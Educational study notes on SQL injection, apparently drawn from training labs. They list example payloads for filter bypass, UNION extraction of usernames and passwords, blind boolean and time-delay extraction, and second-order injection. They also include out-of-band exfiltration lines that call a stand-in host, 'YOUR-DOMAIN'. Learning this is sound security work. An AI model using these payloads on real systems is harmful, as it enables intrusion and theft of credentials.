Concept & Theory: SQL Injection

What is SQL Injection?

Core idea: The app blindly glues your text into a database command. It can't tell if you typed data ("wiener") or a command ("administrator'--"). This lets you trick the database into doing things it shouldn't.

Why it works: The app treats user input as part of the SQL command, not just as data.

The #1 rule: -- means "ignore everything after this" in SQL.

The 6 Attack Types

1. Basic WHERE Bypass (Hidden Data)

Goal: See data that's filtered out.

Trick: Make the WHERE condition always true with OR 1=1--

Example: Gifts' OR 1=1-- → Shows all products.

Memory: "Make the filter always true."

2. UNION Attacks (Extract Data)

Goal: Retrieve data from other tables (like passwords).

Trick: Add UNION SELECT with the same number of columns.

Example: Gifts' UNION SELECT username, password FROM users--

Important: Match column count (use ORDER BY to find it) and find which columns accept text (test with 'a').

Memory: "Staple another table's data onto the results."

3. Blind - Conditional Responses

Goal: Extract data even when no data is shown.

Signal: A visible difference (e.g., "Welcome back" appears or not).

Trick: Ask a yes/no question with AND.

Example: TrackingId=xxx' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--

Automation: Use Burp Intruder + Grep Match for "Welcome back".

Memory: "Read the answer from a text clue."

4. Blind - Time Delays

Goal: Extract data when the page shows ZERO difference.

Signal: Response time (5+ seconds = TRUE, instant = FALSE).

Trick: Use SLEEP() or pg_sleep() inside a condition.

Example (PostgreSQL): xxx' || (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END) || '

Reading results: Sort Intruder results by "Response received" column — big numbers = correct.

Memory: "Read the answer from the clock."

5. Blind - Out-of-Band (OAST)

Goal: Exfiltrate data when neither visible difference nor time delay works.

Signal: An external DNS/HTTP request to a server you control.

Trick: Make the database "phone home" with the data inside the domain name.

Common techniques:

  • PostgreSQL: COPY (SELECT '') TO PROGRAM 'nslookup YOUR-DOMAIN'
  • MySQL: LOAD_FILE(CONCAT('\\',(SELECT password),'.YOUR-DOMAIN\\abc'))
  • Oracle: Use XML entities (XXE) to trigger a DNS lookup.

Easy setup: Use Burp Collaborator, right-click → "Insert Collaborator payload".

Memory: "Send a pigeon with the secret inside its destination address."

6. Second-Order (Stored)

Goal: Exploit when input is safely stored, but later used unsafely.

Example: Sign up with admin'-- (stored safely). Later, an admin panel uses that stored username in a query without sanitizing it → attack triggers.

Why it's tricky: Developers protect the storage step but forget that the same data can become dangerous when reused.

Memory: "Plant the bomb on day 1; it explodes on day 2 in a different place."
